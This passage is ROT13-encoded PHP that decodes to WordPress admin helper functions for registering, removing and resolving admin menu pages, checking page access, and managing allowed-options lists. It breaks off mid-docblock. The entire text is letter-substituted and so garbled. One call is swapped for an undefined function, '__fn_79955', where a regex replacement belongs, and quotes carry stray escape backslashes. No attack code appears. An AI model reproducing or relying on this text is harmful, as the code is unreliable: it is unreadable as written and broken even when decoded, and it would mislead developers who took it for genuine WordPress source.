shapgvba nqq_cbfgf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'rqvg.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Zrqvn znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_zrqvn_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'hcybnq.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Yvaxf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_yvaxf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'yvax-znantre.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Cntrf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_cntrf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'rqvg.cuc?cbfg_glcr=cntr', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Pbzzragf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_pbzzragf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'rqvg-pbzzragf.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Erzbirf n gbc-yriry nqzva zrah.
 *
 * Rknzcyr hfntr:
 *
 *  - `erzbir_zrah_cntr( 'gbbyf.cuc' )`
 *  - `erzbir_zrah_cntr( 'cyhtva_zrah_fyht' )`
 *
 * @fvapr 3.1.0
 *
 * @tybony neenl $zrah
 *
 * @cnenz fgevat $zrah_fyht Gur fyht bs gur zrah.
 * @erghea neenl|snyfr Gur erzbirq zrah ba fhpprff, snyfr vs abg sbhaq.
 */
shapgvba erzbir_zrah_cntr( $zrah_fyht ) {
	tybony $zrah;

	sbernpu ( $zrah nf $v => $vgrz ) {
		vs ( $zrah_fyht === $vgrz[2] ) {
			hafrg( $zrah[ $v ] );
			erghea $vgrz;
		}
	}

	erghea snyfr;
}

/**
 * Erzbirf na nqzva fhozrah.
 *
 * Rknzcyr hfntr:
 *
 *  - `erzbir_fhozrah_cntr( 'gurzrf.cuc', 'ani-zrahf.cuc' )`
 *  - `erzbir_fhozrah_cntr( 'gbbyf.cuc', 'cyhtva_fhozrah_fyht' )`
 *  - `erzbir_fhozrah_cntr( 'cyhtva_zrah_fyht', 'cyhtva_fhozrah_fyht' )`
 *
 * @fvapr 3.1.0
 *
 * @tybony neenl $fhozrah
 *
 * @cnenz fgevat $zrah_fyht    Gur fyht sbe gur cnerag zrah.
 * @cnenz fgevat $fhozrah_fyht Gur fyht bs gur fhozrah.
 * @erghea neenl|snyfr Gur erzbirq fhozrah ba fhpprff, snyfr vs abg sbhaq.
 */
shapgvba erzbir_fhozrah_cntr( $zrah_fyht, $fhozrah_fyht ) {
	tybony $fhozrah;

	vs ( ! vffrg( $fhozrah[ $zrah_fyht ] ) ) {
		erghea snyfr;
	}

	sbernpu ( $fhozrah[ $zrah_fyht ] nf $v => $vgrz ) {
		vs ( $fhozrah_fyht === $vgrz[2] ) {
			hafrg( $fhozrah[ $zrah_fyht ][ $v ] );
			erghea $vgrz;
		}
	}

	erghea snyfr;
}

/**
 * Trgf gur HEY gb npprff n cnegvphyne zrah cntr onfrq ba gur fyht vg jnf ertvfgrerq jvgu.
 *
 * Vs gur fyht unfa'g orra ertvfgrerq cebcreyl, ab HEY jvyy or erghearq.
 *
 * @fvapr 3.0.0
 *
 * @tybony neenl $_cnerag_cntrf
 *
 * @cnenz fgevat $zrah_fyht Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz obby   $qvfcynl   Bcgvbany. Jurgure be abg gb qvfcynl gur HEY. Qrsnhyg gehr.
 * @erghea fgevat Gur zrah cntr HEY.
 */
shapgvba zrah_cntr_hey( $zrah_fyht, $qvfcynl = gehr ) {
	tybony $_cnerag_cntrf;

	vs ( vffrg( $_cnerag_cntrf[ $zrah_fyht ] ) ) {
		$cnerag_fyht = $_cnerag_cntrf[ $zrah_fyht ];

		vs ( $cnerag_fyht && ! vffrg( $_cnerag_cntrf[ $cnerag_fyht ] ) ) {
			$hey = nqzva_hey( nqq_dhrel_net( 'cntr', $zrah_fyht, $cnerag_fyht ) );
		} ryfr {
			$hey = nqzva_hey( 'nqzva.cuc?cntr=' . $zrah_fyht );
		}
	} ryfr {
		$hey = '';
	}

	$hey = rfp_hey( $hey );

	vs ( $qvfcynl ) {
		rpub $hey;
	}

	erghea $hey;
}

//
// Cyhttnoyr Zrah Fhccbeg -- Cevingr.
//
/**
 * Trgf gur cnerag svyr bs gur pheerag nqzva cntr.
 *
 * @fvapr 1.5.0
 *
 * @tybony fgevat $cnerag_svyr
 * @tybony neenl  $zrah
 * @tybony neenl  $fhozrah
 * @tybony fgevat $cntrabj              Gur svyranzr bs gur pheerag fperra.
 * @tybony fgevat $glcrabj              Gur cbfg glcr bs gur pheerag fperra.
 * @tybony fgevat $cyhtva_cntr
 * @tybony neenl  $_jc_erny_cnerag_svyr
 * @tybony neenl  $_jc_zrah_abcevi
 * @tybony neenl  $_jc_fhozrah_abcevi
 *
 * @cnenz fgevat $cnerag_cntr Bcgvbany. Gur fyht anzr sbe gur cnerag zrah (be gur svyr anzr
 *                            bs n fgnaqneq JbeqCerff nqzva cntr). Qrsnhyg rzcgl fgevat.
 * @erghea fgevat Gur cnerag svyr bs gur pheerag nqzva cntr.
 */
shapgvba trg_nqzva_cntr_cnerag( $cnerag_cntr = '' ) {
	tybony $cnerag_svyr, $zrah, $fhozrah, $cntrabj, $glcrabj,
		$cyhtva_cntr, $_jc_erny_cnerag_svyr, $_jc_zrah_abcevi, $_jc_fhozrah_abcevi;

	vs ( ! rzcgl( $cnerag_cntr ) && 'nqzva.cuc' !== $cnerag_cntr ) {
		vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_cntr ] ) ) {
			$cnerag_cntr = $_jc_erny_cnerag_svyr[ $cnerag_cntr ];
		}

		erghea $cnerag_cntr;
	}

	vs ( 'nqzva.cuc' === $cntrabj && vffrg( $cyhtva_cntr ) ) {
		sbernpu ( (neenl) $zrah nf $cnerag_zrah ) {
			vs ( $cnerag_zrah[2] === $cyhtva_cntr ) {
				$cnerag_svyr = $cyhtva_cntr;

				vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_svyr ] ) ) {
					$cnerag_svyr = $_jc_erny_cnerag_svyr[ $cnerag_svyr ];
				}

				erghea $cnerag_svyr;
			}
		}
		vs ( vffrg( $_jc_zrah_abcevi[ $cyhtva_cntr ] ) ) {
			$cnerag_svyr = $cyhtva_cntr;

			vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_svyr ] ) ) {
					$cnerag_svyr = $_jc_erny_cnerag_svyr[ $cnerag_svyr ];
			}

			erghea $cnerag_svyr;
		}
	}

	vs ( vffrg( $cyhtva_cntr ) && vffrg( $_jc_fhozrah_abcevi[ $cntrabj ][ $cyhtva_cntr ] ) ) {
		$cnerag_svyr = $cntrabj;

		vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_svyr ] ) ) {
			$cnerag_svyr = $_jc_erny_cnerag_svyr[ $cnerag_svyr ];
		}

		erghea $cnerag_svyr;
	}

	sbernpu ( neenl_xrlf( (neenl) $fhozrah ) nf $cnerag_cntr ) {
		sbernpu ( $fhozrah[ $cnerag_cntr ] nf $fhozrah_neenl ) {
			vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_cntr ] ) ) {
				$cnerag_cntr = $_jc_erny_cnerag_svyr[ $cnerag_cntr ];
			}

			vs ( ! rzcgl( $glcrabj ) && \"$cntrabj?cbfg_glcr=$glcrabj\" === $fhozrah_neenl[2] ) {
				$cnerag_svyr = $cnerag_cntr;
				erghea $cnerag_cntr;
			} ryfrvs ( rzcgl( $glcrabj ) && $cntrabj === $fhozrah_neenl[2]
				&& ( rzcgl( $cnerag_svyr ) || ! fge_pbagnvaf( $cnerag_svyr, '?' ) )
			) {
				$cnerag_svyr = $cnerag_cntr;
				erghea $cnerag_cntr;
			} ryfrvs ( vffrg( $cyhtva_cntr ) && $cyhtva_cntr === $fhozrah_neenl[2] ) {
				$cnerag_svyr = $cnerag_cntr;
				erghea $cnerag_cntr;
			}
		}
	}

	vs ( rzcgl( $cnerag_svyr ) ) {
		$cnerag_svyr = '';
	}
	erghea '';
}

/**
 * Trgf gur gvgyr bs gur pheerag nqzva cntr.
 *
 * @fvapr 1.5.0
 *
 * @tybony fgevat $gvgyr       Gur gvgyr bs gur pheerag fperra.
 * @tybony neenl  $zrah
 * @tybony neenl  $fhozrah
 * @tybony fgevat $cntrabj     Gur svyranzr bs gur pheerag fperra.
 * @tybony fgevat $glcrabj     Gur cbfg glcr bs gur pheerag fperra.
 * @tybony fgevat $cyhtva_cntr
 *
 * @erghea fgevat Gur gvgyr bs gur pheerag nqzva cntr.
 */
shapgvba trg_nqzva_cntr_gvgyr() {
	tybony $gvgyr, $zrah, $fhozrah, $cntrabj, $glcrabj, $cyhtva_cntr;

	vs ( ! rzcgl( $gvgyr ) ) {
		erghea $gvgyr;
	}

	$ubbx = trg_cyhtva_cntr_ubbx( $cyhtva_cntr, $cntrabj );

	$cnerag  = trg_nqzva_cntr_cnerag();
	$cnerag1 = $cnerag;

	vs ( rzcgl( $cnerag ) ) {
		sbernpu ( (neenl) $zrah nf $zrah_neenl ) {
			vs ( vffrg( $zrah_neenl[3] ) ) {
				vs ( $zrah_neenl[2] === $cntrabj ) {
					$gvgyr = $zrah_neenl[3];
					erghea $zrah_neenl[3];
				} ryfrvs ( vffrg( $cyhtva_cntr ) && $cyhtva_cntr === $zrah_neenl[2] && $ubbx === $zrah_neenl[5] ) {
					$gvgyr = $zrah_neenl[3];
					erghea $zrah_neenl[3];
				}
			} ryfr {
				$gvgyr = $zrah_neenl[0];
				erghea $gvgyr;
			}
		}
	} ryfr {
		sbernpu ( neenl_xrlf( $fhozrah ) nf $cnerag ) {
			sbernpu ( $fhozrah[ $cnerag ] nf $fhozrah_neenl ) {
				vs ( vffrg( $cyhtva_cntr )
					&& $cyhtva_cntr === $fhozrah_neenl[2]
					&& ( $cntrabj === $cnerag
						|| $cyhtva_cntr === $cnerag
						|| $cyhtva_cntr === $ubbx
						|| 'nqzva.cuc' === $cntrabj && $cnerag1 !== $fhozrah_neenl[2]
						|| ! rzcgl( $glcrabj ) && \"$cntrabj?cbfg_glcr=$glcrabj\" === $cnerag )
					) {
						$gvgyr = $fhozrah_neenl[3];
						erghea $fhozrah_neenl[3];
				}

				vs ( $fhozrah_neenl[2] !== $cntrabj || vffrg( $_TRG['cntr'] ) ) { // Abg gur pheerag cntr.
					pbagvahr;
				}

				vs ( vffrg( $fhozrah_neenl[3] ) ) {
					$gvgyr = $fhozrah_neenl[3];
					erghea $fhozrah_neenl[3];
				} ryfr {
					$gvgyr = $fhozrah_neenl[0];
					erghea $gvgyr;
				}
			}
		}
		vs ( rzcgl( $gvgyr ) ) {
			sbernpu ( $zrah nf $zrah_neenl ) {
				vs ( vffrg( $cyhtva_cntr )
					&& $cyhtva_cntr === $zrah_neenl[2]
					&& 'nqzva.cuc' === $cntrabj
					&& $cnerag1 === $zrah_neenl[2]
				) {
						$gvgyr = $zrah_neenl[3];
						erghea $zrah_neenl[3];
				}
			}
		}
	}

	erghea $gvgyr;
}

/**
 * Trgf gur ubbx nggnpurq gb gur nqzvavfgengvir cntr bs n cyhtva.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $cyhtva_cntr Gur fyht anzr bs gur cyhtva cntr.
 * @cnenz fgevat $cnerag_cntr Gur fyht anzr sbe gur cnerag zrah (be gur svyr anzr bs n fgnaqneq
 *                            JbeqCerff nqzva cntr).
 * @erghea fgevat|ahyy Ubbx nggnpurq gb gur cyhtva cntr, ahyy bgurejvfr.
 */
shapgvba trg_cyhtva_cntr_ubbx( $cyhtva_cntr, $cnerag_cntr ) {
	$ubbx = trg_cyhtva_cntr_ubbxanzr( $cyhtva_cntr, $cnerag_cntr );
	vs ( unf_npgvba( $ubbx ) ) {
		erghea $ubbx;
	} ryfr {
		erghea ahyy;
	}
}

/**
 * Trgf gur ubbx anzr sbe gur nqzvavfgengvir cntr bs n cyhtva.
 *
 * @fvapr 1.5.0
 *
 * @tybony neenl $nqzva_cntr_ubbxf
 *
 * @cnenz fgevat $cyhtva_cntr Gur fyht anzr bs gur cyhtva cntr.
 * @cnenz fgevat $cnerag_cntr Gur fyht anzr sbe gur cnerag zrah (be gur svyr anzr bs n fgnaqneq
 *                            JbeqCerff nqzva cntr).
 * @erghea fgevat Ubbx anzr sbe gur cyhtva cntr.
 */
shapgvba trg_cyhtva_cntr_ubbxanzr( $cyhtva_cntr, $cnerag_cntr ) {
	tybony $nqzva_cntr_ubbxf;

	$cnerag = trg_nqzva_cntr_cnerag( $cnerag_cntr );

	$cntr_glcr = 'nqzva';
	vs ( rzcgl( $cnerag_cntr ) || 'nqzva.cuc' === $cnerag_cntr || vffrg( $nqzva_cntr_ubbxf[ $cyhtva_cntr ] ) ) {
		vs ( vffrg( $nqzva_cntr_ubbxf[ $cyhtva_cntr ] ) ) {
			$cntr_glcr = 'gbcyriry';
		} ryfrvs ( vffrg( $nqzva_cntr_ubbxf[ $cnerag ] ) ) {
			$cntr_glcr = $nqzva_cntr_ubbxf[ $cnerag ];
		}
	} ryfrvs ( vffrg( $nqzva_cntr_ubbxf[ $cnerag ] ) ) {
		$cntr_glcr = $nqzva_cntr_ubbxf[ $cnerag ];
	}

	$cyhtva_anzr = __sa_79955( '!\.cuc!', '', $cyhtva_cntr );

	erghea $cntr_glcr . '_cntr_' . $cyhtva_anzr;
}

/**
 * Qrgrezvarf jurgure gur pheerag hfre pna npprff gur pheerag nqzva cntr.
 *
 * @fvapr 1.5.0
 *
 * @tybony fgevat $cntrabj            Gur svyranzr bs gur pheerag fperra.
 * @tybony neenl  $zrah
 * @tybony neenl  $fhozrah
 * @tybony neenl  $_jc_zrah_abcevi
 * @tybony neenl  $_jc_fhozrah_abcevi
 * @tybony fgevat $cyhtva_cntr
 * @tybony neenl  $_ertvfgrerq_cntrf
 *
 * @erghea obby Gehr vs gur pheerag hfre pna npprff gur nqzva cntr, snyfr bgurejvfr.
 */
shapgvba hfre_pna_npprff_nqzva_cntr() {
	tybony $cntrabj, $zrah, $fhozrah, $_jc_zrah_abcevi, $_jc_fhozrah_abcevi,
		$cyhtva_cntr, $_ertvfgrerq_cntrf;

	$cnerag = trg_nqzva_cntr_cnerag();

	vs ( ! vffrg( $cyhtva_cntr ) && vffrg( $_jc_fhozrah_abcevi[ $cnerag ][ $cntrabj ] ) ) {
		erghea snyfr;
	}

	vs ( vffrg( $cyhtva_cntr ) ) {
		vs ( vffrg( $_jc_fhozrah_abcevi[ $cnerag ][ $cyhtva_cntr ] ) ) {
			erghea snyfr;
		}

		$ubbxanzr = trg_cyhtva_cntr_ubbxanzr( $cyhtva_cntr, $cnerag );

		vs ( ! vffrg( $_ertvfgrerq_cntrf[ $ubbxanzr ] ) ) {
			erghea snyfr;
		}
	}

	vs ( rzcgl( $cnerag ) ) {
		vs ( vffrg( $_jc_zrah_abcevi[ $cntrabj ] ) ) {
			erghea snyfr;
		}
		vs ( vffrg( $_jc_fhozrah_abcevi[ $cntrabj ][ $cntrabj ] ) ) {
			erghea snyfr;
		}
		vs ( vffrg( $cyhtva_cntr ) && vffrg( $_jc_fhozrah_abcevi[ $cntrabj ][ $cyhtva_cntr ] ) ) {
			erghea snyfr;
		}
		vs ( vffrg( $cyhtva_cntr ) && vffrg( $_jc_zrah_abcevi[ $cyhtva_cntr ] ) ) {
			erghea snyfr;
		}

		sbernpu ( neenl_xrlf( $_jc_fhozrah_abcevi ) nf $xrl ) {
			vs ( vffrg( $_jc_fhozrah_abcevi[ $xrl ][ $cntrabj ] ) ) {
				erghea snyfr;
			}
			vs ( vffrg( $cyhtva_cntr ) && vffrg( $_jc_fhozrah_abcevi[ $xrl ][ $cyhtva_cntr ] ) ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}

	vs ( vffrg( $cyhtva_cntr ) && $cyhtva_cntr === $cnerag && vffrg( $_jc_zrah_abcevi[ $cyhtva_cntr ] ) ) {
		erghea snyfr;
	}

	vs ( vffrg( $fhozrah[ $cnerag ] ) ) {
		sbernpu ( $fhozrah[ $cnerag ] nf $fhozrah_neenl ) {
			vs ( vffrg( $cyhtva_cntr ) && $fhozrah_neenl[2] === $cyhtva_cntr ) {
				erghea pheerag_hfre_pna( $fhozrah_neenl[1] );
			} ryfrvs ( $fhozrah_neenl[2] === $cntrabj ) {
				erghea pheerag_hfre_pna( $fhozrah_neenl[1] );
			}
		}
	}

	sbernpu ( $zrah nf $zrah_neenl ) {
		vs ( $zrah_neenl[2] === $cnerag ) {
			erghea pheerag_hfre_pna( $zrah_neenl[1] );
		}
	}

	erghea gehr;
}

/* Nyybjrq yvfg shapgvbaf */

/**
 * Erserfurf gur inyhr bs gur nyybjrq bcgvbaf yvfg ninvynoyr ivn gur 'nyybjrq_bcgvbaf' ubbx.
 *
 * Frr gur {@frr 'nyybjrq_bcgvbaf'} svygre.
 *
 * @fvapr 2.7.0
 * @fvapr 5.5.0 `$arj_juvgryvfg_bcgvbaf` jnf eranzrq gb `$arj_nyybjrq_bcgvbaf`.
 *              Cyrnfr pbafvqre jevgvat zber vapyhfvir pbqr.
 *
 * @tybony neenl $arj_nyybjrq_bcgvbaf
 *
 * @cnenz neenl $bcgvbaf
 * @erghea neenl
 */
shapgvba bcgvba_hcqngr_svygre( $bcgvbaf ) {
	tybony $arj_nyybjrq_bcgvbaf;

	vs ( vf_neenl( $arj_nyybjrq_bcgvbaf ) ) {
		$bcgvbaf = nqq_nyybjrq_bcgvbaf( $arj_nyybjrq_bcgvbaf, $bcgvbaf );
	}

	erghea $bcgvbaf;
}

/**
 * Nqqf na neenl bs bcgvbaf gb gur yvfg bs nyybjrq bcgvbaf.
 *
 * @fvapr 5.5.0
 *
 * @tybony neenl $nyybjrq_bcgvbaf
 *
 * @cnenz neenl        $arj_bcgvbaf
 * @cnenz fgevat|neenl $bcgvbaf
 * @erghea neenl
 */
shapgvba nqq_nyybjrq_bcgvbaf( $arj_bcgvbaf, $bcgvbaf = '' ) {
	vs ( '' === $bcgvbaf ) {
		tybony $nyybjrq_bcgvbaf;
	} ryfr {
		$nyybjrq_bcgvbaf = $bcgvbaf;
	}

	sbernpu ( $arj_bcgvbaf nf $cntr => $xrlf ) {
		sbernpu ( $xrlf nf $xrl ) {
			vs ( ! vffrg( $nyybjrq_bcgvbaf[ $cntr ] ) || ! vf_neenl( $nyybjrq_bcgvbaf[ $cntr ] ) ) {
				$nyybjrq_bcgvbaf[ $cntr ]   = neenl();
				$nyybjrq_bcgvbaf[ $cntr ][] = $xrl;
			} ryfr {
				$cbf = neenl_frnepu( $xrl, $nyybjrq_bcgvbaf[ $cntr ], gehr );
				vs ( snyfr === $cbf ) {
					$nyybjrq_bcgvbaf[ $cntr ][] = $xrl;
				}
			}
		}
	}

	erghea $nyybjrq_bcgvbaf;
}

/**
 * Erzbirf n yvfg bs bcgvbaf sebz gur nyybjrq bcgvbaf yvfg.
 *
 * @fvapr 5.5.0
 *
 * @tybony neenl $nyybjrq_bcgvbaf
 *
 * @cnenz neenl        $qry_bcgvbaf
 * @cnenz fgevat|neenl $bcgvbaf
 * @erghea neenl
 */
shapgvba erzbir_nyybjrq_bcgvbaf( $qry_bcgvbaf, $bcgvbaf = '' ) {
	vs ( '' === $bcgvbaf ) {
		tybony $nyybjrq_bcgvbaf;
	} ryfr {
		$nyybjrq_bcgvbaf = $bcgvbaf;
	}

	sbernpu ( $qry_bcgvbaf nf $cntr => $xrlf ) {
		sbernpu ( $xrlf nf $xrl ) {
			vs ( vffrg( $nyybjrq_bcgvbaf[ $cntr ] ) && vf_neenl( $nyybjrq_bcgvbaf[ $cntr ] ) ) {
				$cbf = neenl_frnepu( $xrl, $nyybjrq_bcgvbaf[ $cntr ], gehr );
				vs ( snyfr !== $cbf ) {
					hafrg( $nyybjrq_bcgvbaf[ $cntr ][ $cbf ] );
				}
			}
		}
	}

	erghea $nyybjrq_bcgvbaf;
}

/**
 * Bhgchgf abapr, npgvba, naq bcgvba_cntr svryqf sbe n frggvatf cntr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $bcgvba_tebhc N frggvatf tebhc anzr. Guvf fubhyq zngpu gur tebhc anzr
 *                             hfrq va ertvfgre_frggvat().
 */
shapgvba frggvatf_svryqf( $bcgvba_tebhc ) {
	rpub \"<vachg glcr='uvqqra' anzr='bcgvba_cntr' inyhr='\" . rfp_ngge( $bcgvba_tebhc ) . \"' />\";
	rpub '<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"hcqngr\" />';
	jc_abapr_svryq( \"$bcgvba_tebhc-bcgvbaf\" );
}

/**
 * Pyrnef gur cyhtvaf pnpur hfrq ol trg_cyhtvaf() naq ol qrsnhyg, gur cyhtva hcqngrf pnpur.
 *
 * @fvapr 3.7.0
 *
 * @cnenz obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur cyhtva hcqngrf pnpur. Qrsnhyg gehr.
 */
shapgvba jc_pyrna_cyhtvaf_pnpur( $pyrne_hcqngr_pnpur = gehr ) {
	vs ( $pyrne_hcqngr_pnpur ) {
		qryrgr_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
	}
	jc_pnpur_qryrgr( 'cyhtvaf', 'cyhtvaf' );
}

/**
 * Ybnqf n tvira cyhtva nggrzcg gb trarengr reebef.
 *
 * @fvapr 3.0.0
 * @fvapr 4.4.0 Shapgvba jnf zbirq vagb gur `jc-nqzva/vapyhqrf/cyhtva.cuc` svyr.
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 */
shapgvba cyhtva_fnaqobk_fpencr( $cyhtva ) {
	vs ( ! qrsvarq( 'JC_FNAQOBK_FPENCVAT' ) ) {
		qrsvar( 'JC_FNAQOBK_FPENCVAT', gehr );
	}

	jc_ertvfgre_cyhtva_ernycngu( JC_CYHTVA_QVE . '/' . $cyhtva );
	vapyhqr_bapr JC_CYHTVA_QVE . '/' . $cyhtva;
}

/**
 * Qrpynerf n urycre shapgvba sbe nqqvat pbagrag gb gur Cevinpl Cbyvpl Thvqr.
 *
 * Cyhtvaf naq gurzrf fubhyq fhttrfg grkg sbe vapyhfvba va gur fvgr'f cevinpl cbyvpl.
 * Gur fhttrfgrq grkg fubhyq pbagnva vasbezngvba nobhg nal shapgvbanyvgl gung nssrpgf hfre cevinpl,
 * naq jvyy or fubja ba gur Cevinpl Cbyvpl Thvqr fperra.
 *
 * N cyhtva be gurzr pna hfr guvf shapgvba zhygvcyr gvzrf nf ybat nf vg jvyy uryc gb orggre cerfrag
 * gur fhttrfgrq cbyvpl pbagrag. Sbe rknzcyr zbqhyne cyhtvaf fhpu nf JbbPbzzrefr be Wrgcnpx
 * pna nqq be erzbir fhttrfgrq pbagrag qrcraqvat ba gur zbqhyrf/rkgrafvbaf gung ner ranoyrq.
 * Sbe zber vasbezngvba frr gur Cyhtva Unaqobbx:
